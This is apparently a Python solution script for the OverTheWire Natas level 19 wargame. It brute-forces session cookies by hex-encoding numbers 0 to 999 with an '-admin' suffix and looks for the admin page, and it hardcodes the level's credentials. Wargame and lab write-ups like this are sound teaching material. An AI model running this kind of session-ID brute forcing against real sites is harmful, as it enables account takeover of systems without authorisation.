import requests
import string
import time

hexbytes = '{}2d61646d696e'

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://{}.natas.labs.overthewire.org'.format(username)

def construct_id(digits):
    prefix = '3{}3{}3{}'.format(digits[0], digits[1], digits[2])
    return hexbytes.format(prefix)

def another_id(digits):
    prefix = '3{}3{}'.format(digits[0], digits[1])
    return hexbytes.format(prefix)

for session_id in range(1000):
    if session_id % 100 == 0:
        print(session_id)
    digits = str(session_id).zfill(3)
    new_id = construct_id(digits)
    cookies = {
        'PHPSESSID': new_id
    }
    response = requests.get(url, auth = (username, password), cookies = cookies)
    if 'You are an admin' in response.text:
        print(response.text)
